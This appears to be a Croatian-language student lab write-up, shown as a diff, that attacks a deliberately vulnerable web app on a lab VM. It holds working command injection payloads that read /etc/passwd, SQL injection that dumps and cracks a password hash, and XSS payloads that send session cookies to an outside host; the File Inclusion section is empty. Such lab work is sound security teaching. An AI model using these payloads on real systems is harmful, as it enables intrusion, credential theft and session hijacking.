@@ -1,0 +1,139 @@
+> Preporučujem otvoriti datoteku kao Markdown datoteku.
+
+## 0. Spajanje
+
+Spojio sam se na URL: http://192.168.56.102/ (host-only)
+
+## 1. Command Injection
+
+Ispis passwd datoteke unošenjem `1 | cat /etc/passwd`:
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+Listanje root direktorija unošenjem `; ls -la /`:
+```console
+total 84
+drwxr-xr-x   1 root root 4096 May 22 09:03 .
+drwxr-xr-x   1 root root 4096 May 22 09:03 ..
+-rwxr-xr-x   1 root root    0 May 22 09:03 .dockerenv
+drwxr-xr-x   1 root root 4096 Oct 12  2018 bin
+drwxr-xr-x   2 root root 4096 Jul 13  2017 boot
+drwxr-xr-x   5 root root  360 May 22 09:03 dev
+drwxr-xr-x   1 root root 4096 May 22 09:03 etc
+drwxr-xr-x   2 root root 4096 Jul 13  2017 home
+drwxr-xr-x   1 root root 4096 Oct  9  2017 lib
+drwxr-xr-x   1 root root 4096 Oct 12  2018 lib64
+-rwxr-xr-x   1 root root  231 Oct 12  2018 main.sh
+drwxr-xr-x   2 root root 4096 Oct  9  2017 media
+drwxr-xr-x   2 root root 4096 Oct  9  2017 mnt
+drwxr-xr-x   2 root root 4096 Oct  9  2017 opt
+dr-xr-xr-x 182 root root    0 May 22 09:03 proc
+drwx------   2 root root 4096 Oct  9  2017 root
+drwxr-xr-x   1 root root 4096 Oct 12  2018 run
+drwxr-xr-x   1 root root 4096 Oct 12  2018 sbin
+drwxr-xr-x   2 root root 4096 Oct  9  2017 srv
+dr-xr-xr-x  13 root root    0 May 22 09:03 sys
+drwxrwxrwt   1 root root 4096 May 22 09:03 tmp
+drwxr-xr-x   1 root root 4096 Oct  9  2017 usr
+drwxr-xr-x   1 root root 4096 Oct 12  2018 var
+```
+
+## 2. SQL Incjection
+
+Prvo sam isprobao upisati neki validni id:
+Za `User ID :1`
+```
+ID: 1
+First name: admin
+Surname: admin
+```
+
+Sve korisnike dohvatio sam unošenjem `' or '1'='1`:
+```
+ID: ' or '1'='1
+First name: admin
+Surname: admin
+ID: ' or '1'='1
+First name: Gordon
+Surname: Brown
+ID: ' or '1'='1
+First name: Hack
+Surname: Me
+ID: ' or '1'='1
+First name: Pablo
+Surname: Picasso
+ID: ' or '1'='1
+First name: Bob
+Surname: Smith
+```
+
+Unošenjem `' or 1=1 union select user_id, password from users#` mogu se vidjeti svi hashevi po ID-u:
+```
+...
+ID: ' or 1=1 union select user_id, password from users#
+First name: Pablo
+Surname: Picasso
+...
+ID: ' or 1=1 union select user_id, password from users#
+First name: 4
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+...
+```
+
+Lako je vidjeti da Pablo Picasso ima ID 4 te da je njegov hash `0d107d09f5bbe40cade3de5c71e9e9b7`.
+Zatim sam na VM izvrtio sljedeće linije:
+```console
+srs@srs-lab-2020:~/srs-lab$ echo '0d107d09f5bbe40cade3de5c71e9e9b7' > hash
+srs@srs-lab-2020:~/srs-lab$ sudo Lab3/john/run/john --format=raw-md5 hash 
+```
+Na izlazu bila je vidljiva lozinka `letmein`. Istu lozinku dobio sam i pomoću crackstation.net.
+
+## 3. Cross Site Scripting
+
+### XSS Stored
+
+Jednostavni Message koji stvara alert: `<script>alert('Hakiran si!')</script>`.
+
+Za dohvat cookie podataka: `<script>alert(document.cookie)</script>`.
+Podaci su:
+```
+PHPSESSID=8knjqdrdn6ttafjminkt5fspi0
+security=low
+```
+
+Preusmjerevanje kolačića:
+```
+Message: <script>document.location.href='http://public.tel.fer.hr/srs?cookie='+document.cookie;</script>
+```
+Polje unosa ograničeno je na 50 znakova, no to je lako zaobići otvaranjem DevToolsa, odabirom elementa `textarea` te povećanjem atributa `maxlength` na pr. 500.
+
+### XSS Reflected
+
+Dovoljno je za name unijeti:
+```
+haker<script>document.location.href='http://public.tel.fer.hr/srs?cookie='+document.cookie;</script>
+```
+Za ime će se postaviti `haker`, a nakon toga će se pokrenuti skripta koja će poslati kolačiće.
+
+## 4. File Inclusion
+
